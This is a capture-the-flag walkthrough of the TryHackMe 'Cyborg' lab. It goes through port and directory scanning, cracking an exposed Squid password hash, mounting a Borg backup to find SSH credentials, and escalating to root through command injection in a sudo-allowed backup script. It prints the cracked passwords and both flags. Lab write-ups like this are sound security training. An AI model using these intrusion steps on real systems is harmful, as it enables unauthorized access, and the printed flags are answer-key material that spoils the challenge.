## CTF Writeup: Cyborg

**Target IP:** `10.48.130.178`
**Difficulty:** Easy
**Platform:** TryHackMe (Cyborg)

---

## 1. Reconnaissance & Enumeration

### Port Scanning
An initial Nmap scan was performed to identify open ports and services:
```bash
nmap -sC -sV -oN nmap_initial.txt 10.48.130.178
```
**Results:**
*   **22/tcp**: SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.10)
*   **80/tcp**: HTTP (Apache httpd 2.4.18)

### Web Enumeration
A directory scan using `gobuster` revealed several interesting paths:
```bash
gobuster dir -u http://10.48.130.178/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
**Key Findings:**
*   `/admin`: Contained `admin.html`, which featured a shoutbox where a user named **Alex** mentioned misconfiguring the Squid proxy and leaving configuration files exposed.
*   `/etc`: Contained a `/squid` directory with sensitive configuration files.

### Extracting Credentials
Navigating to `http://10.48.130.178/etc/squid/`, I found:
*   `passwd`: Contained a salted MD5 hash for a user named `music_archive`.
*   `squid.conf`: Provided context on the proxy setup.

The hash was cracked using **John the Ripper** and the `rockyou.txt` wordlist:
*   **User:** `music_archive`
*   **Password:** `squidward`

---

## 2. Initial Access

### The Borg Backup
An `archive.tar` file was discovered and downloaded from the web server. Upon extraction, it was found to be a **Borg Backup** repository.

Using the cracked password (`squidward`) as the `BORG_PASSPHRASE`, I listed the archives:
```bash
export BORG_PASSPHRASE='squidward'
borg list /home/kali/home/field/dev/final_archive
```
This revealed an archive named `music_archive`. I then mounted the archive to browse its contents:
```bash
mkdir /tmp/borg_mount
yes | borg mount /home/kali/home/field/dev/final_archive::music_archive /tmp/borg_mount
```

### Finding SSH Credentials
Inside the mounted filesystem, I located Alex's home directory and found a note:
*   **Path:** `/tmp/borg_mount/home/alex/Documents/note.txt`
*   **Content:** `alex:S3cretP@s3`

---

## 3. Foothold

Using the credentials found in the backup, I logged into the target machine via SSH:
```bash
ssh alex@10.48.130.178
```

### User Flag
The user flag was found in Alex's home directory:
*   **Flag:** `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`

---

## 4. Privilege Escalation

### Sudo Privileges
Checking sudo rights for `alex`:
```bash
sudo -l
# (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

### Exploiting the Backup Script
The `/etc/mp3backups/backup.sh` script contained a command injection vulnerability:
```bash
while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done
...
cmd=$($command)
echo $cmd
```
The script executes whatever is passed to the `-c` flag as the root user. I exploited this to read the root flag:
```bash
sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'
```

### Root Flag
*   **Flag:** `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`

---

## Summary
*   **User Flag:** `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
*   **Root Flag:** `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`
